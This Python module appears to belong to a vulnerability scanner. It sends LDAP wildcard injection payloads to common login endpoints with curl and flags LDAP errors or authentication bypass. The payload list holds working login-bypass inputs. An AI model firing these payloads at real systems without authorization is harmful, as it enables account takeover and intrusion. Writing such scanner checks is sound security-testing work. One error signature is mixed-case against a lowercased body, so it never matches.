"""LDAP injection probing on login/auth endpoints."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class LDAPInjectionCheck(BaseCheck):
    """Probe login endpoints with LDAP wildcard payloads."""

    name = "LDAP Injection"
    description = "Test login/auth endpoints with LDAP wildcard payloads"

    LOGIN_PATHS = [
        "/login", "/auth", "/signin", "/api/login",
        "/api/auth", "/user/login", "/admin/login",
    ]

    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "*)(|(mail=*))",
        "*)(|(password=*))",
        "admin)(&",
        "*))%00",
    ]

    SUCCESS_SIGNATURES = [
        '"token":', '"session":', '"authenticated":true',
        '"success":true', '"login":true',
        "location: /dashboard", "location: /home",
    ]

    LDAP_ERROR_SIGS = [
        "ldap error", "invalid dn syntax",
        "ldap_bind", "javax.naming", "LDAP: error code",
    ]

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for path in self.LOGIN_PATHS:
                url = f"{base}{path}"
                rc_base, baseline, _ = run(
                    ["curl", "-s", "--max-time", "6",
                     "-X", "POST",
                     "-d", "username=nonexistent12345&password=wrongpass",
                     url],
                    timeout=10,
                )
                baseline_body = (baseline or "").lower()

                for payload in self.LDAP_PAYLOADS:
                    rc, body, _ = run(
                        ["curl", "-si", "--max-time", "6",
                         "-X", "POST",
                         "-d", f"username={payload}&password=anything",
                         url],
                        timeout=10,
                    )
                    if rc != 0 or not body:
                        continue
                    body_lower = body.lower()
                    for sig in self.LDAP_ERROR_SIGS:
                        # Baseline guard: if the benign login response
                        # already contains this LDAP error string (e.g. the
                        # endpoint always surfaces LDAP error text), it's
                        # not caused by our payload.
                        if sig in body_lower and sig not in baseline_body:
                            self.findings.append(Finding(
                                severity="high",
                                title="LDAP Injection - Error Signature",
                                host=base,
                                detail=(
                                    f"Payload triggered LDAP error at {url}: {sig}. "
                                    "Benign login did not trigger the error, so the "
                                    "injected characters reached the LDAP filter."
                                ),
                                source="ldap_injection",
                                url=url,
                                evidence=sig,
                            ))
                            return self.findings
                    for sig in self.SUCCESS_SIGNATURES:
                        if sig in body_lower and sig not in baseline_body:
                            self.findings.append(Finding(
                                severity="critical",
                                title="LDAP Injection - Authentication Bypass",
                                host=base,
                                detail=f"Payload bypassed login at {url}",
                                source="ldap_injection",
                                url=url,
                                evidence=payload,
                            ))
                            return self.findings
        return self.findings
